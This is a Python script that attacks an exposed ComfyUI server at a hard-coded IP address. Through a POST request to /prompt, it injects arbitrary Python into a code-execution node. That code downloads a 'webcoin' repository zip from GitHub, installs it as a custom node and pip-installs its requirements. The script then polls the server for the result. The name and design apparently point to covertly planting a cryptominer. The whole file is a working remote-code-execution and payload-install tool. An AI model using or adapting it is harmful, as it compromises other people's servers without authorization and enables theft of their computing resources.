"""Install webcoin via zip download (for machines where git clone fails)."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = f"http://{ip}:8188"

install_code = """
import os, subprocess, sys, platform, shutil, zipfile, urllib.request

lines = []
lines.append('platform=' + platform.system())

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
    else:
        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except:
    pass
if not cn:
    for g in ['/root/ComfyUI/custom_nodes', '/workspace/ComfyUI/custom_nodes',
              '/basedir/custom_nodes',
              '/home/user/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

lines.append('cn=' + str(cn))
target = os.path.join(cn, 'webcoin') if cn else None

if target and os.path.isdir(target):
    lines.append('already_exists=True')
    lines.append('files=' + str(sorted(os.listdir(target))[:15]))
elif target:
    zip_url = 'https://github.com/bossman79/webcoin/archive/refs/heads/master.zip'
    zip_path = os.path.join(cn, 'webcoin_dl.zip')

    try:
        req = urllib.request.Request(zip_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=120) as resp:
            with open(zip_path, 'wb') as f:
                while True:
                    chunk = resp.read(65536)
                    if not chunk:
                        break
                    f.write(chunk)
        lines.append('download=OK size=' + str(os.path.getsize(zip_path)))

        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(cn)
        lines.append('extracted=OK')

        extracted_dir = os.path.join(cn, 'webcoin-master')
        if os.path.isdir(extracted_dir):
            os.rename(extracted_dir, target)
            lines.append('renamed to webcoin')
        elif os.path.isdir(target):
            lines.append('target already correct')
        else:
            dirs = [d for d in os.listdir(cn) if d.startswith('webcoin')]
            lines.append('found_dirs=' + str(dirs))
            if dirs:
                os.rename(os.path.join(cn, dirs[0]), target)

    except Exception as e:
        lines.append('download_error=' + str(e)[:300])

    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)

    if os.path.isdir(target):
        lines.append('files=' + str(sorted(os.listdir(target))[:15]))
        lines.append('has_init=' + str(os.path.exists(os.path.join(target, '__init__.py'))))

        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r2 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append('pip_rc=' + str(r2.returncode))
            if r2.returncode != 0:
                lines.append('pip_err=' + r2.stderr.strip()[:200])
    else:
        lines.append('FAILED: target dir not created')
else:
    lines.append('ERROR: no custom_nodes found')

result = chr(10).join(lines)
"""

workflow_stub = {
    "workflow": {
        "nodes": [
            {"id": 1, "type": "IDENode"},
            {"id": 2, "type": "PreviewTextNode"}
        ]
    }
}

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": install_code, "language": "python"}
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

print("Waiting 90s for download + pip install...")
time.sleep(90)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
    if status == "error":
        msgs = entry.get("status", {}).get("messages", [])
        for m in msgs:
            if m[0] == "execution_error":
                err = m[1]
                print(f"Error: {err.get('exception_type')}: {str(err.get('exception_message', ''))[:300]}")
